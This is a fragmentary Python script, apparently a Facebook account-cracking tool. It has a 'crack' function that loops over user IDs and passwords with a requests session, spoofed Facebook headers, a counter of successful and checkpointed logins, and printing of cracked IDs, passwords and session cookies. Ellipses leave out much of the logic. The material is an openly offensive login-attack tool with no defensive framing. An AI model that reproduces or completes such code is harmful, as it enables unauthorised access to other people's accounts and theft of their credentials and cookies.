...
def crack(idf,pwv):
	...
	ses = requests.Session()
	print("\r\u001b[37;1mr[VEAR,VIP9] ["+str(loop)+"|"+str(len(id))+"] [\u001b[32;1m"+str(ok)+"\u001b[37;1m=\u001b[33;1m"+str(cp)+"\u001b[37;1m]",end="")
...
'bi_xrwh': 0
    ...
    'x-fb-request-id': 'AnOpLVHKqD7_qzZs0GSFyvp',
    'x-fb-trace-id': 'CzdULWnHs8z',
    'x-fb-rev': '1008050967',
    'x-fb-debug': 'mc4e30+k0/RtBD6RvrgGvy+bL+6z6ardT+AsrenbYjDNxltN3QbKE9YOqWXGWNwL/FTJHd8lAtEZbSrBlyxnxw==',
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;92m [VEAR,VIP9-OK ] {idf} | {pw} | {kuki}')
